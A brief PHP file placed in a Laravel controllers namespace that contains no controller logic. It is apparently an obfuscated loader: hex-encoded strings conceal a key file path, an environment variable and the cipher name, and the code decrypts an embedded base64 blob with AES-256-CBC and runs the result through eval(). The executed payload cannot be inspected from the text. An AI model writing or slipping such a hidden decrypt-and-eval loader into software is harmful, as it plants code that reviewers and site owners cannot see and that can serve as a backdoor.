<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('7aR+gSdHTYDE6dfFSWFyMQ==');

$c=base64_decode(

'17iHhEmHi1Z1YvrOBvUnGAofw8WHhfQksI/MLKJyDMSlWUKSTuXiW9TWoZZ/Ceu4R0gS5w6R303U' .
'42EKiwaHDoX8QKLYtLb5e3Yuyb3ukZ6NyDsS8xyaxDYSaPj1Jz3ta+2jcLJuEuDC17uSzXOPKkP8' .
'PV8yavQhERRebSJ0bmCxC6+jAwzfBAvL73ubEg/jRqMbn7w8sedQpZvazlqaFjeFJkxlGqIZ/muC' .
'/USmi5fkdMqDdttUoYVhju8AcFT1'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

